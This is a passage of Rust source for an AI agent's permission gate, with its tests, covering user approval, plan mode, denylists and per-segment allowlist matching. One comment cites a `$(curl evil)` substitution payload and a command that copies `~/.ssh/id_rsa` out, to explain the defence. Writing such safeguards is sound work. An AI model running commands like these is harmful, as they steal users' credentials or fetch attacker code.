use std::sync::Arc;

use agent_core::domain::{AgentEvent, PermissionOption, PermissionOptionKind, PermissionRequest};
use agent_core::ids::{PermissionRequestId, SessionId, ToolCallId};
use async_channel::Sender;
use serde_json::Value;
use tokio::sync::Mutex;
use tokio_util::sync::CancellationToken;

use crate::loop_state::{Decision, Resolution, RunControl, SessionState};
use crate::mcp::is_mcp_tool;
use crate::safety::{classify_command, CommandRisk};
use crate::tools::{PermissionMode, ToolCtx, ToolExecutor};

#[derive(Clone)]
pub(crate) struct PermissionGate {
    session: Arc<Mutex<SessionState>>,
    control: Arc<Mutex<RunControl>>,
    /// Only permission acquisition is serialized. Once each request is
    /// approved, non-mutating tool bodies can still execute concurrently.
    permission_queue: Arc<Mutex<()>>,
    session_id: SessionId,
    events: Sender<AgentEvent>,
    execution: Option<crate::root_execution::RootExecutionTrace>,
}

pub(crate) enum PermissionOutcome {
    Allowed,
    Denied(String),
    Cancelled,
    Failed(String),
}

enum PermissionWaitOutcome {
    Resolved(Resolution),
    Cancelled,
    Failed(String),
}

impl PermissionGate {
    pub fn new(
        session: Arc<Mutex<SessionState>>,
        control: Arc<Mutex<RunControl>>,
        session_id: SessionId,
        events: Sender<AgentEvent>,
    ) -> Self {
        Self {
            session,
            control,
            permission_queue: Arc::new(Mutex::new(())),
            session_id,
            events,
            execution: None,
        }
    }

    pub(crate) fn with_execution(
        mut self,
        execution: crate::root_execution::RootExecutionTrace,
    ) -> Self {
        self.execution = Some(execution);
        self
    }

    pub async fn check(
        &self,
        tool_id: &ToolCallId,
        tool_name: &str,
        exec: &dyn ToolExecutor,
        args: &Value,
        ctx: &ToolCtx,
        signal: &CancellationToken,
    ) -> PermissionOutcome {
        if !exec.permission_class().requires_gate() {
            return PermissionOutcome::Allowed;
        }

        if self.session.lock().await.planning.plan_mode() {
            if tool_name == "enter_plan_mode" {
                return PermissionOutcome::Denied(
                    "Plan mode is already active — research and call propose_plan when your \
                    plan is ready."
                        .to_string(),
                );
            }
            // Plan mode is a research phase, not a straitjacket: strictly
            // read-only shell (ls, git log, rg…) may still run. The hard floor
            // (Blocked classification + user denylist) is checked first so
            // plan mode never widens what a command could do.
            if tool_name == "bash" {
                let info = gate_info(tool_name, args);
                if let Some(why) = self.hard_refusal(tool_name, &info).await {
                    return PermissionOutcome::Denied(format!(
                        "Refused: {why}. The command was not run."
                    ));
                }
                if info.requires_elevation {
                    return PermissionOutcome::Denied(
                        "Plan mode is active — network and host access cannot be granted while \
                        the session is read-only. Finish the plan, then run the command after \
                        approval."
                            .to_string(),
                    );
                }
                if crate::safety::is_read_only_command(info.detail.as_deref().unwrap_or("")) {
                    return PermissionOutcome::Allowed;
                }
                return PermissionOutcome::Denied(
                    "Plan mode is active — only read-only commands can run right now, and \
                    this command could change something. Research with read-only tools, then \
                    call propose_plan."
                        .to_string(),
                );
            }
            return PermissionOutcome::Denied(
                "Plan mode is active — read-only until your plan is approved. Research more, \
                then call propose_plan."
                    .to_string(),
            );
        }

        let mut info = gate_info(tool_name, args);
        if let Some(diff) = exec.preview(args, ctx) {
            info.detail = Some(diff);
        }

        if let Some(why) = self.hard_refusal(tool_name, &info).await {
            return PermissionOutcome::Denied(format!("Refused: {why}. The command was not run."));
        }

        if self.command_preapproved(tool_name, &info).await {
            return PermissionOutcome::Allowed;
        }

        // Entering Plan Mode must always get an explicit human answer. Plan
        // proposals themselves use the typed ProposedPlan contract instead.
        let is_plan_gate = tool_name == "enter_plan_mode";
        let mode = if is_plan_gate {
            PermissionMode::Ask
        } else {
            let s = self.session.lock().await;
            s.policy
                .get(tool_name)
                .copied()
                .unwrap_or(PermissionMode::Ask)
        };
        let (approved, _feedback) = match mode {
            PermissionMode::Allow => (true, None),
            PermissionMode::Deny => (false, None),
            PermissionMode::Ask => {
                match self.ask_permission(tool_id, tool_name, &info, signal).await {
                    PermissionWaitOutcome::Resolved(resolution) => {
                        (resolution.decision.approved(), resolution.feedback)
                    }
                    PermissionWaitOutcome::Cancelled => return PermissionOutcome::Cancelled,
                    PermissionWaitOutcome::Failed(message) => {
                        return PermissionOutcome::Failed(message)
                    }
                }
            }
        };

        if tool_name == "enter_plan_mode" && approved {
            let mut s = self.session.lock().await;
            s.planning
                .set_mode(agent_core::provider::CollaborationMode::Plan);
        }

        if approved {
            PermissionOutcome::Allowed
        } else if tool_name == "enter_plan_mode" {
            PermissionOutcome::Denied(
                "The user wants you to proceed directly — skip the planning phase and build \
                it, asking questions as needed."
                    .to_string(),
            )
        } else {
            PermissionOutcome::Denied(format!("The user denied permission to run `{tool_name}`."))
        }
    }

    /// Whether Plan Mode is currently active for this session.
    async fn ask_permission(
        &self,
        tool_id: &ToolCallId,
        tool_name: &str,
        info: &GateInfo,
        signal: &CancellationToken,
    ) -> PermissionWaitOutcome {
        // clark-agent runs non-mutating tools in parallel, but the desktop UI
        // intentionally presents one permission decision at a time. Queue only
        // this acquisition phase; the guard is released before the tool body
        // runs, preserving parallel fetch/read execution after authorization.
        let _permission_turn = tokio::select! {
            biased;
            _ = signal.cancelled() => return PermissionWaitOutcome::Cancelled,
            guard = self.permission_queue.lock() => guard,
        };
        if signal.is_cancelled() {
            return PermissionWaitOutcome::Cancelled;
        }

        // A prior request in this same parallel batch may have changed the
        // session policy while this one waited its turn. Honor that decision
        // instead of surfacing a redundant prompt or running against stale
        // authorization state.
        let is_plan_gate = tool_name == "enter_plan_mode";
        if !is_plan_gate {
            if self.command_preapproved(tool_name, info).await {
                return PermissionWaitOutcome::Resolved(Decision::AllowOnce.into());
            }
            match self
                .session
                .lock()
                .await
                .policy
                .get(tool_name)
                .copied()
                .unwrap_or(PermissionMode::Ask)
            {
                PermissionMode::Allow => {
                    return PermissionWaitOutcome::Resolved(Decision::AllowOnce.into())
                }
                PermissionMode::Deny => {
                    return PermissionWaitOutcome::Resolved(Decision::RejectOnce.into())
                }
                PermissionMode::Ask => {}
            }
        }

        if let Some(execution) = &self.execution {
            execution.transition(
                agent_orchestration::ExecutionState::AwaitingInput,
                Some(format!("permission requested for {tool_name}")),
            );
        }
        let request_id = PermissionRequestId::new(format!("perm-{}", tool_id.as_str()));
        let (responder, rx) = tokio::sync::oneshot::channel();
        {
            let mut control = self.control.lock().await;
            if let Err(existing) = control.arm(request_id.clone(), responder) {
                return PermissionWaitOutcome::Failed(format!(
                    "permission coordination error: request `{}` was still pending when `{}` tried to start",
                    existing.as_str(),
                    request_id.as_str()
                ));
            }
        }

        if self
            .events
            .send(AgentEvent::PermissionRequest {
                request: PermissionRequest {
                    id: request_id.clone(),
                    session: self.session_id.clone(),
                    tool_call: Some(tool_id.clone()),
                    title: permission_title(tool_name, info),
                    options: permission_options(tool_name),
                    detail: info.detail.clone(),
                    risk: if tool_name == "enter_plan_mode" {
                        Some("plan_entry".to_string())
                    } else if tool_name == "generate_image" {
                        // Keep this distinct from generic external/MCP work so
                        // the UI can accurately name a billed generation while
                        // still requiring review in Auto mode.
                        Some("billed".to_string())
                    } else if info.external {
                        Some("external".to_string())
                    } else if matches!(info.risk, Some(CommandRisk::Danger)) {
                        Some("danger".to_string())
                    } else if info.network {
                        Some("network".to_string())
                    } else if info.requires_elevation {
                        Some("sandbox".to_string())
                    } else {
                        info.risk.map(|r| r.as_str().to_string())
                    },
                    reason: info.reason.clone(),
                },
            })
            .await
            .is_err()
        {
            self.control.lock().await.clear_if(&request_id);
            return PermissionWaitOutcome::Failed(format!(
                "permission coordination error: request `{}` could not be delivered",
                request_id.as_str()
            ));
        }

        let outcome = tokio::select! {
            biased;
            _ = signal.cancelled() => PermissionWaitOutcome::Cancelled,
            result = rx => match result {
                Ok(resolution) => PermissionWaitOutcome::Resolved(resolution),
                Err(_) if signal.is_cancelled() => PermissionWaitOutcome::Cancelled,
                Err(_) => PermissionWaitOutcome::Failed(format!(
                    "permission coordination error: response channel for `{}` closed without a decision",
                    request_id.as_str()
                )),
            },
        };
        if let PermissionWaitOutcome::Resolved(resolution) = &outcome {
            // Apply "always" while this request still owns the queue. The next
            // parallel waiter then observes the updated policy before deciding
            // whether it needs to ask.
            if !is_plan_gate {
                self.apply_policy(tool_name, info, resolution.decision)
                    .await;
            }
        }
        if let Some(execution) = &self.execution {
            execution.transition(
                agent_orchestration::ExecutionState::Running,
                Some("permission wait resolved".to_string()),
            );
        }
        if !matches!(outcome, PermissionWaitOutcome::Resolved(_)) {
            self.control.lock().await.clear_if(&request_id);
        }
        outcome
    }

    async fn hard_refusal(&self, name: &str, info: &GateInfo) -> Option<String> {
        if name != "bash" {
            return None;
        }
        if matches!(info.risk, Some(CommandRisk::Blocked)) {
            return Some(
                info.reason
                    .clone()
                    .unwrap_or_else(|| "blocked for safety".to_string()),
            );
        }
        let cmd = info.detail.clone().unwrap_or_default();
        let s = self.session.lock().await;
        s.deny_commands
            .iter()
            .any(|d| prefix_match(&cmd, d))
            .then(|| "on your command denylist".to_string())
    }

    async fn command_preapproved(&self, name: &str, info: &GateInfo) -> bool {
        if name != "bash"
            || !matches!(
                info.risk,
                Some(CommandRisk::Safe) | Some(CommandRisk::Caution)
            )
        {
            return false;
        }
        let cmd = info.detail.clone().unwrap_or_default();
        // Never preapprove command substitution: it can't be split into segments,
        // so an allowlisted prefix (`cargo test`) would otherwise carry a hidden
        // `$(curl evil)` / backtick payload straight past the gate.
        if cmd.contains("$(") || cmd.contains('`') {
            return false;
        }
        // Match the allowlist PER SEGMENT, not against the whole raw line: an
        // "always allow `cargo test`" grant must not silently run
        // `cargo test && cp ~/.ssh/id_rsa /tmp` just because the line starts with
        // the trusted prefix. Every segment must be individually trusted — either
        // allowlisted by prefix, or inherently Safe (so `cargo test | tee log`
        // still preapproves).
        let segments = crate::safety::split_segments(&cmd);
        if segments.is_empty() {
            return false;
        }
        let s = self.session.lock().await;
        let mut matched_explicit_rule = false;
        for segment in segments {
            if s.allow_commands
                .iter()
                .any(|allowed| prefix_match(segment, allowed))
            {
                matched_explicit_rule = true;
            } else if classify_command(segment).risk != CommandRisk::Safe {
                return false;
            }
        }
        // Safe commands are auto-resolved by Auto mode in the UI. They must
        // still reach the permission request in Ask mode unless the user has
        // explicitly remembered a matching command rule.
        matched_explicit_rule
    }

    async fn apply_policy(&self, tool: &str, info: &GateInfo, decision: Decision) {
        let mut s = self.session.lock().await;
        match decision {
            Decision::AllowAlways => {
                if tool == "bash" {
                    if let Some(cmd) = info.detail.as_deref() {
                        let entry = cmd.trim().to_string();
                        if !entry.is_empty() && !s.allow_commands.contains(&entry) {
                            s.allow_commands.push(entry);
                        }
                    }
                } else {
                    s.policy.insert(tool.to_string(), PermissionMode::Allow);
                }
            }
            Decision::RejectAlways => {
                s.policy.insert(tool.to_string(), PermissionMode::Deny);
            }
            _ => {}
        }
    }
}

struct GateInfo {
    detail: Option<String>,
    risk: Option<CommandRisk>,
    reason: Option<String>,
    external: bool,
    network: bool,
    requires_elevation: bool,
}

fn gate_info(name: &str, args: &Value) -> GateInfo {
    if is_mcp_tool(name) {
        let pretty = serde_json::to_string_pretty(args).unwrap_or_else(|_| args.to_string());
        return GateInfo {
            detail: Some(pretty),
            risk: None,
            reason: Some("connected service action - review its inputs".to_string()),
            external: true,
            network: false,
            requires_elevation: false,
        };
    }
    match name {
        "web_fetch" => GateInfo {
            detail: args.get("url").and_then(Value::as_str).map(str::to_string),
            risk: None,
            reason: Some("accesses an external site directly from this device".to_string()),
            external: true,
            network: false,
            requires_elevation: false,
        },
        "bash" => {
            let cmd = args
                .get("command")
                .and_then(Value::as_str)
                .unwrap_or("")
                .trim()
                .to_string();
            let c = classify_command(&cmd);
            let network = crate::safety::command_requires_network(&cmd);
            let explicitly_requested = args
                .get("sandbox_permissions")
                .and_then(Value::as_str)
                .is_some_and(|value| value == "require_escalated");
            let justification = args
                .get("justification")
                .and_then(Value::as_str)
                .map(str::trim)
                .filter(|value| !value.is_empty())
                .map(str::to_string);
            let requires_elevation =
                explicitly_requested || crate::safety::command_requires_host(&cmd);
            GateInfo {
                detail: Some(cmd),
                risk: Some(c.risk),
                reason: justification.or(c.reason).or_else(|| {
                    requires_elevation
                        .then(|| "requires access outside the project sandbox".to_string())
                }),
                external: false,
                network,
                requires_elevation,
            }
        }
        "write_file" | "edit_file" => GateInfo {
            detail: args.get("path").and_then(Value::as_str).map(str::to_string),
            risk: None,
            reason: None,
            external: false,
            network: false,
            requires_elevation: false,
        },
        "enter_plan_mode" => GateInfo {
            detail: args
                .get("reason")
                .and_then(Value::as_str)
                .map(str::to_string),
            risk: None,
            reason: None,
            external: false,
            network: false,
            requires_elevation: false,
        },
        // Image generation writes an output file and calls Clark's billed
        // platform relay. Keep it outside automatic approval and show the
        // visual intent without serializing large reference-image payloads.
        "generate_image" => {
            let prompt = args
                .get("prompt")
                .and_then(Value::as_str)
                .unwrap_or("(no prompt provided)");
            let mut prompt_preview = prompt.chars().take(300).collect::<String>();
            if prompt.chars().nth(300).is_some() {
                prompt_preview.push('…');
            }
            let output = args
                .get("output_path")
                .and_then(Value::as_str)
                .unwrap_or("images/<prompt>.<returned-format>");
            GateInfo {
                detail: Some(format!(
                    "Generate image through Clark (may consume credits)\nPrompt: {prompt_preview}\nSave to: {output} (extension matches returned image)"
                )),
                risk: None,
                reason: Some(
                    "uses a billed Clark image-generation call; review the visual intent"
                        .to_string(),
                ),
                external: true,
                network: false,
                requires_elevation: false,
            }
        }
        // MCP-tool posture, not `clark_research`'s zero-gate one: it drives a
        // real browser against live sites under arbitrary session state, a
        // much larger blast radius than a bounded server-side call — `external:
        // true` keeps it out of "auto" mode's default-safe auto-approval.
        "browser" => {
            let pretty = serde_json::to_string_pretty(args).unwrap_or_else(|_| args.to_string());
            GateInfo {
                detail: Some(pretty),
                risk: None,
                reason: Some("experimental browser tool - review its action".to_string()),
                external: true,
                network: false,
                requires_elevation: false,
            }
        }
        _ => GateInfo {
            detail: None,
            risk: None,
            reason: None,
            external: false,
            network: false,
            requires_elevation: false,
        },
    }
}

fn prefix_match(cmd: &str, entry: &str) -> bool {
    let cmd = cmd.trim();
    let entry = entry.trim();
    !entry.is_empty() && (cmd == entry || cmd.starts_with(&format!("{entry} ")))
}

fn permission_title(tool: &str, info: &GateInfo) -> String {
    match tool {
        "bash" if info.network => "Allow this command to use the network?".to_string(),
        "bash" if info.requires_elevation => {
            "Run this command outside the project sandbox?".to_string()
        }
        "bash" => "Run a shell command?".to_string(),
        "edit_file" => "Apply this edit?".to_string(),
        "write_file" => "Write this file?".to_string(),
        "enter_plan_mode" => "Start with a plan?".to_string(),
        "generate_image" => "Generate an image?".to_string(),
        "browser" => "Run this browser action?".to_string(),
        "web_fetch" => "Access this external site?".to_string(),
        t if is_mcp_tool(t) => "Run this connected action?".to_string(),
        _ => "Allow this action to run?".to_string(),
    }
}

fn permission_options(tool: &str) -> Vec<PermissionOption> {
    if tool == "enter_plan_mode" {
        return vec![
            PermissionOption {
                id: "allow_once".into(),
                label: "Yes, plan first".into(),
                kind: PermissionOptionKind::AllowOnce,
            },
            PermissionOption {
                id: "reject_once".into(),
                label: "No, just build".into(),
                kind: PermissionOptionKind::RejectOnce,
            },
        ];
    }
    let always = if tool == "bash" {
        "Always allow this command".to_string()
    } else if is_mcp_tool(tool) {
        "Always allow connected actions".to_string()
    } else {
        "Always allow similar actions".to_string()
    };
    vec![
        PermissionOption {
            id: "allow_once".into(),
            label: "Allow once".into(),
            kind: PermissionOptionKind::AllowOnce,
        },
        PermissionOption {
            id: "allow_always".into(),
            label: always,
            kind: PermissionOptionKind::AllowAlways,
        },
        PermissionOption {
            id: "reject_once".into(),
            label: "Reject".into(),
            kind: PermissionOptionKind::RejectOnce,
        },
    ]
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn prefix_matching_keeps_word_boundary() {
        assert!(prefix_match("cargo test --lib", "cargo test"));
        assert!(prefix_match("cargo test", "cargo test"));
        assert!(!prefix_match("cargo testfoo", "cargo test"));
    }

    #[test]
    fn tool_titles_are_user_facing() {
        assert_eq!(
            permission_title("bash", &bash_gate("cargo test")),
            "Run a shell command?"
        );
        assert_eq!(
            permission_title("bash", &bash_gate("gh pr view 123")),
            "Allow this command to use the network?"
        );
        assert_eq!(
            permission_title(
                "bash",
                &gate_info(
                    "bash",
                    &serde_json::json!({
                        "command": "tool-with-custom-host-access",
                        "sandbox_permissions": "require_escalated",
                    }),
                ),
            ),
            "Run this command outside the project sandbox?"
        );
        assert_eq!(
            permission_title("write_file", &gate_info("write_file", &Value::Null)),
            "Write this file?"
        );
        assert_eq!(
            permission_title(
                "enter_plan_mode",
                &gate_info("enter_plan_mode", &Value::Null)
            ),
            "Start with a plan?"
        );
        assert_eq!(
            permission_title("generate_image", &gate_info("generate_image", &Value::Null)),
            "Generate an image?"
        );
        assert_eq!(
            permission_title("browser", &gate_info("browser", &Value::Null)),
            "Run this browser action?"
        );
        assert_eq!(
            permission_title(
                "mcp_github_create_issue",
                &gate_info("mcp_github_create_issue", &Value::Null)
            ),
            "Run this connected action?"
        );
        assert_eq!(
            permission_title(
                "future_internal_tool",
                &gate_info("future_internal_tool", &Value::Null)
            ),
            "Allow this action to run?"
        );
        assert_eq!(
            permission_options("future_internal_tool")[1].label,
            "Always allow similar actions"
        );
    }

    #[test]
    fn image_generation_requires_external_review_without_copying_reference_bytes() {
        let info = gate_info(
            "generate_image",
            &serde_json::json!({
                "prompt": "A small mossy cabin beside a lake",
                "input_images": ["data:image/png;base64,very-large-image"],
                "output_path": "images/cabin.png",
            }),
        );
        assert!(info.external);
        let detail = info.detail.expect("generation detail");
        assert!(detail.contains("mossy cabin"));
        assert!(detail.contains("images/cabin.png"));
        assert!(detail.contains("extension matches returned image"));
        assert!(!detail.contains("very-large-image"));
    }

    #[tokio::test]
    async fn image_generation_uses_the_typed_billed_permission_risk() {
        let dir = tempfile::tempdir().unwrap();
        let session = Arc::new(Mutex::new(SessionState::default()));
        let control = Arc::new(Mutex::new(RunControl::default()));
        let (tx, rx) = async_channel::unbounded::<AgentEvent>();
        let gate = PermissionGate::new(session, control.clone(), SessionId::new("s1"), tx);
        let ctx = test_ctx(dir.path());

        let check = tokio::spawn(async move {
            gate.check(
                &ToolCallId::new("image-1"),
                "generate_image",
                &FakeMutating,
                &serde_json::json!({"prompt": "a small yellow house"}),
                &ctx,
                &CancellationToken::new(),
            )
            .await
        });

        let event = rx.recv().await.unwrap();
        let AgentEvent::PermissionRequest { request } = event else {
            panic!("expected a permission request");
        };
        assert_eq!(request.risk.as_deref(), Some("billed"));
        control
            .lock()
            .await
            .resolve(&request.id, Decision::AllowOnce.into());
        assert!(matches!(check.await.unwrap(), PermissionOutcome::Allowed));
    }

    #[test]
    fn browser_gate_info_is_marked_external_like_mcp_tools() {
        let info = gate_info(
            "browser",
            &serde_json::json!({"action": "navigate", "url": "https://x"}),
        );
        assert!(info.external);
        assert!(info.detail.unwrap().contains("navigate"));
    }

    #[test]
    fn connected_service_permission_does_not_expose_its_internal_name() {
        let info = gate_info(
            "mcp_github_create_issue",
            &serde_json::json!({"title": "Bug report"}),
        );

        assert!(info.external);
        assert!(info.detail.as_deref().unwrap().contains("Bug report"));
        assert!(!info.detail.as_deref().unwrap().contains("mcp_github"));
        assert_eq!(
            info.reason.as_deref(),
            Some("connected service action - review its inputs")
        );
    }

    struct FakeMutating;

    #[async_trait::async_trait]
    impl ToolExecutor for FakeMutating {
        fn name(&self) -> &str {
            "fake_mutate"
        }
        fn description(&self) -> &str {
            "test tool"
        }
        fn parameters(&self) -> Value {
            serde_json::json!({})
        }
        fn kind(&self) -> agent_core::domain::ToolKind {
            agent_core::domain::ToolKind::Other
        }
        fn mutating(&self) -> bool {
            true
        }
        async fn invoke(&self, _args: Value, _ctx: &ToolCtx) -> crate::tools::ToolOutcome {
            crate::tools::ToolOutcome::ok("done")
        }
    }

    struct FakeClarkCloud;

    #[async_trait::async_trait]
    impl ToolExecutor for FakeClarkCloud {
        fn name(&self) -> &str {
            "clark_research"
        }
        fn description(&self) -> &str {
            "test cloud tool"
        }
        fn parameters(&self) -> Value {
            serde_json::json!({})
        }
        fn kind(&self) -> agent_core::domain::ToolKind {
            agent_core::domain::ToolKind::Research
        }
        fn permission_class(&self) -> crate::tools::ToolPermissionClass {
            crate::tools::ToolPermissionClass::BrokeredClarkCloud
        }
        async fn invoke(&self, _args: Value, _ctx: &ToolCtx) -> crate::tools::ToolOutcome {
            crate::tools::ToolOutcome::ok("done")
        }
    }

    struct FakeExternal;

    #[async_trait::async_trait]
    impl ToolExecutor for FakeExternal {
        fn name(&self) -> &str {
            "fake_external"
        }
        fn description(&self) -> &str {
            "test external tool"
        }
        fn parameters(&self) -> Value {
            serde_json::json!({})
        }
        fn kind(&self) -> agent_core::domain::ToolKind {
            agent_core::domain::ToolKind::Fetch
        }
        fn permission_class(&self) -> crate::tools::ToolPermissionClass {
            crate::tools::ToolPermissionClass::External
        }
        async fn invoke(&self, _args: Value, _ctx: &ToolCtx) -> crate::tools::ToolOutcome {
            crate::tools::ToolOutcome::ok("done")
        }
    }

    fn test_ctx(dir: &std::path::Path) -> ToolCtx {
        ToolCtx {
            sandbox: Arc::new(crate::sandbox::Sandbox::new(dir).unwrap()),
            executor: Arc::new(crate::exec::LocalExecutor),
            reads: Arc::new(std::sync::Mutex::new(crate::tools::ReadTracker::default())),
            cancel: CancellationToken::new(),
            background: Arc::new(crate::background::BackgroundTasks::default()),
            session: Arc::new(tokio::sync::Mutex::new(SessionState::default())),
            progress: None,
            agent_progress: None,
            call_progress: None,
        }
    }

    fn plan_session_state() -> SessionState {
        let mut state = SessionState::default();
        state
            .planning
            .set_mode(agent_core::provider::CollaborationMode::Plan);
        state
    }

    #[tokio::test]
    async fn brokered_clark_cloud_is_default_allowed_without_opening_local_network() {
        let dir = tempfile::tempdir().unwrap();
        let session = Arc::new(Mutex::new(SessionState::default()));
        let control = Arc::new(Mutex::new(RunControl::default()));
        let (tx, rx) = async_channel::unbounded::<AgentEvent>();
        let gate = PermissionGate::new(session, control, SessionId::new("s1"), tx);
        let outcome = gate
            .check(
                &ToolCallId::new("t1"),
                "clark_research",
                &FakeClarkCloud,
                &serde_json::json!({"query": "current docs"}),
                &test_ctx(dir.path()),
                &CancellationToken::new(),
            )
            .await;
        assert!(matches!(outcome, PermissionOutcome::Allowed));
        assert!(rx.is_empty());
    }

    #[tokio::test]
    async fn parallel_external_permissions_are_presented_and_resolved_without_loss() {
        let dir = tempfile::tempdir().unwrap();
        let session = Arc::new(Mutex::new(SessionState::default()));
        let control = Arc::new(Mutex::new(RunControl::default()));
        let (tx, rx) = async_channel::unbounded::<AgentEvent>();
        let gate = PermissionGate::new(
            session,
            control.clone(),
            SessionId::new("parallel-session"),
            tx,
        );
        let ctx = test_ctx(dir.path());

        let first_gate = gate.clone();
        let first_ctx = ctx.clone();
        let first = tokio::spawn(async move {
            first_gate
                .check(
                    &ToolCallId::new("web_fetch_0"),
                    "web_fetch",
                    &FakeExternal,
                    &serde_json::json!({"url": "https://one.example"}),
                    &first_ctx,
                    &CancellationToken::new(),
                )
                .await
        });
        let second = tokio::spawn(async move {
            gate.check(
                &ToolCallId::new("web_fetch_1"),
                "web_fetch",
                &FakeExternal,
                &serde_json::json!({"url": "https://two.example"}),
                &ctx,
                &CancellationToken::new(),
            )
            .await
        });

        let AgentEvent::PermissionRequest {
            request: first_request,
        } = rx.recv().await.expect("first permission request")
        else {
            panic!("expected a permission request");
        };
        assert!(
            tokio::time::timeout(std::time::Duration::from_millis(25), rx.recv())
                .await
                .is_err(),
            "the second permission must queue instead of replacing the first"
        );
        assert!(control
            .lock()
            .await
            .resolve(&first_request.id, Decision::AllowOnce.into()));

        let AgentEvent::PermissionRequest {
            request: second_request,
        } = rx.recv().await.expect("second permission request")
        else {
            panic!("expected a permission request");
        };
        assert_ne!(first_request.id, second_request.id);
        assert!(control
            .lock()
            .await
            .resolve(&second_request.id, Decision::AllowOnce.into()));

        assert!(matches!(first.await.unwrap(), PermissionOutcome::Allowed));
        assert!(matches!(second.await.unwrap(), PermissionOutcome::Allowed));
    }

    #[tokio::test]
    async fn allow_always_applies_to_parallel_waiters_before_they_prompt() {
        let dir = tempfile::tempdir().unwrap();
        let session = Arc::new(Mutex::new(SessionState::default()));
        let control = Arc::new(Mutex::new(RunControl::default()));
        let (tx, rx) = async_channel::unbounded::<AgentEvent>();
        let gate = PermissionGate::new(
            session,
            control.clone(),
            SessionId::new("always-session"),
            tx,
        );
        let ctx = test_ctx(dir.path());
        let mut checks = Vec::new();
        for index in 0..2 {
            let gate = gate.clone();
            let ctx = ctx.clone();
            checks.push(tokio::spawn(async move {
                gate.check(
                    &ToolCallId::new(format!("web_fetch_{index}")),
                    "web_fetch",
                    &FakeExternal,
                    &serde_json::json!({"url": format!("https://{index}.example")}),
                    &ctx,
                    &CancellationToken::new(),
                )
                .await
            }));
        }

        let AgentEvent::PermissionRequest { request } =
            rx.recv().await.expect("first permission request")
        else {
            panic!("expected a permission request");
        };
        assert!(control
            .lock()
            .await
            .resolve(&request.id, Decision::AllowAlways.into()));
        for check in checks {
            assert!(matches!(check.await.unwrap(), PermissionOutcome::Allowed));
        }
        assert!(
            rx.is_empty(),
            "the queued call must inherit allow-always without another prompt"
        );
    }

    #[tokio::test]
    async fn orphaned_permission_responder_is_an_explicit_failure() {
        let dir = tempfile::tempdir().unwrap();
        let session = Arc::new(Mutex::new(SessionState::default()));
        let control = Arc::new(Mutex::new(RunControl::default()));
        let (tx, rx) = async_channel::unbounded::<AgentEvent>();
        let gate = PermissionGate::new(
            session,
            control.clone(),
            SessionId::new("orphan-session"),
            tx,
        );
        let ctx = test_ctx(dir.path());
        let check = tokio::spawn(async move {
            gate.check(
                &ToolCallId::new("web_fetch_orphan"),
                "web_fetch",
                &FakeExternal,
                &serde_json::json!({"url": "https://example.com"}),
                &ctx,
                &CancellationToken::new(),
            )
            .await
        });

        let AgentEvent::PermissionRequest { .. } = rx.recv().await.expect("permission request")
        else {
            panic!("expected a permission request");
        };
        control.lock().await.clear();

        let PermissionOutcome::Failed(message) = check.await.unwrap() else {
            panic!("an orphaned permission must not masquerade as user cancellation");
        };
        assert!(message.contains("closed without a decision"));
    }

    #[tokio::test]
    async fn closed_permission_event_channel_is_an_explicit_failure() {
        let dir = tempfile::tempdir().unwrap();
        let session = Arc::new(Mutex::new(SessionState::default()));
        let control = Arc::new(Mutex::new(RunControl::default()));
        let (tx, rx) = async_channel::unbounded::<AgentEvent>();
        rx.close();
        let gate = PermissionGate::new(
            session,
            control.clone(),
            SessionId::new("closed-events-session"),
            tx,
        );
        let ctx = test_ctx(dir.path());

        let PermissionOutcome::Failed(message) = gate
            .check(
                &ToolCallId::new("web_fetch_closed_events"),
                "web_fetch",
                &FakeExternal,
                &serde_json::json!({"url": "https://example.com"}),
                &ctx,
                &CancellationToken::new(),
            )
            .await
        else {
            panic!("an undeliverable permission must not wait or look cancelled");
        };
        assert!(message.contains("could not be delivered"));
        assert!(!control.lock().await.has_pending());
    }

    #[tokio::test]
    async fn plan_mode_denies_mutating_tools_except_propose_plan() {
        let dir = tempfile::tempdir().unwrap();
        let session = Arc::new(Mutex::new(plan_session_state()));
        let control = Arc::new(Mutex::new(RunControl::default()));
        let (tx, _rx) = async_channel::unbounded::<AgentEvent>();
        let gate = PermissionGate::new(session, control, SessionId::new("s1"), tx);
        let ctx = test_ctx(dir.path());
        let outcome = gate
            .check(
                &ToolCallId::new("t1"),
                "fake_mutate",
                &FakeMutating,
                &serde_json::json!({}),
                &ctx,
                &CancellationToken::new(),
            )
            .await;
        assert!(matches!(outcome, PermissionOutcome::Denied(_)));
    }

    #[tokio::test]
    async fn document_workspace_writes_are_denied_in_plan_mode() {
        let project = tempfile::tempdir().unwrap();
        let docs = tempfile::tempdir().unwrap();
        let session = Arc::new(Mutex::new(plan_session_state()));
        let control = Arc::new(Mutex::new(RunControl::default()));
        let (tx, rx) = async_channel::unbounded::<AgentEvent>();
        let gate = PermissionGate::new(session, control, SessionId::new("s1"), tx);
        let mut ctx = test_ctx(project.path());
        ctx.sandbox = Arc::new(
            crate::sandbox::Sandbox::new(project.path())
                .unwrap()
                .with_docs(docs.path().to_path_buf()),
        );
        let target = ctx.sandbox.docs_root().unwrap().join("design.md");

        let outcome = gate
            .check(
                &ToolCallId::new("t1"),
                "write_file",
                &FakeMutating,
                &serde_json::json!({"path": target}),
                &ctx,
                &CancellationToken::new(),
            )
            .await;

        assert!(matches!(outcome, PermissionOutcome::Denied(_)));
        assert!(rx.is_empty(), "plan-mode writes must not prompt");
    }

    #[tokio::test]
    async fn document_workspace_writes_reach_the_ask_mode_gate() {
        let project = tempfile::tempdir().unwrap();
        let docs = tempfile::tempdir().unwrap();
        let session = Arc::new(Mutex::new(SessionState::default()));
        let control = Arc::new(Mutex::new(RunControl::default()));
        let (tx, rx) = async_channel::unbounded::<AgentEvent>();
        let gate =
            PermissionGate::new(session, control.clone(), SessionId::new("docs-session"), tx);
        let mut ctx = test_ctx(project.path());
        ctx.sandbox = Arc::new(
            crate::sandbox::Sandbox::new(project.path())
                .unwrap()
                .with_docs(docs.path().to_path_buf()),
        );
        let target = ctx.sandbox.docs_root().unwrap().join("design.md");

        let check = tokio::spawn(async move {
            gate.check(
                &ToolCallId::new("docs-1"),
                "write_file",
                &FakeMutating,
                &serde_json::json!({"path": target}),
                &ctx,
                &CancellationToken::new(),
            )
            .await
        });

        let AgentEvent::PermissionRequest { request } = rx.recv().await.unwrap() else {
            panic!("expected a document write permission request");
        };
        assert_eq!(request.title, "Write this file?");
        control
            .lock()
            .await
            .resolve(&request.id, Decision::AllowOnce.into());
        assert!(matches!(check.await.unwrap(), PermissionOutcome::Allowed));
    }

    #[tokio::test]
